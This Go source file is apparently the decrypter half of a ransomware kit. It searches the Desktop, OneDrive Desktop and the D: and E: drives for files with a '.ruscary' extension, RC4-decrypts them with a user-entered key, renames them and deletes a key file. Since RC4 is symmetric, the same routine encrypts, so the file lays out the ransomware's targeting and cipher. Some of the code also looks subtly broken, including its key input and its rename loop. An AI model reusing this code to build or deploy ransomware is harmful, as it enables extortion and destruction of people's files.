package main

import (
	"crypto/rc4"
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const chrome = "chromeInstall"
const version = "1.7.5"

var files []string

func readfile(filename string) string {
	file, err := os.ReadFile(filename)
	if err != nil {
		return ""
	}

	return string(file)
}

func scanfile() {

	root := [...]string{os.Getenv("USERPROFILE") + "/Desktop/", os.Getenv("USERPROFILE") + "/OneDrive/Desktop/", "D:\\", "E:\\"}
	for _, rootpath := range root {
		filepath.Walk(rootpath, func(path string, nfo fs.FileInfo, err error) error {

			ok := strings.HasSuffix(path, ".ruscary")

			if ok {
				files = append(files, path)
			}

			return nil
		})

	}

}
func deco(txtfile []byte, key []byte) []byte {

	dest2 := make([]byte, len(txtfile))
	enc, _ := rc4.NewCipher(key)
	enc.XORKeyStream(dest2, txtfile)
	return dest2
}

func main() {
	time.Sleep(20000)
	fmt.Print("Decrypter \n\nInsert key:")
	scanfile()

	var key []byte
	_, err := fmt.Scanf("%v", &key)

	if err != nil {
		fmt.Println("Wrong!")
	} else {

		for _, rdf := range files {
			rdfile := readfile(rdf)
			decoed := deco([]byte(rdfile), key)
			ioutil.WriteFile(rdf, decoed, 0644)
			dontscary := strings.Split(rdf, ".ruscary")
			for _, scary := range dontscary {
				os.Rename(rdf, scary)
			}

		}
		os.Remove(os.Getenv("USERPROFILE") + "/key.key")

	}

	os.Exit(3)
}
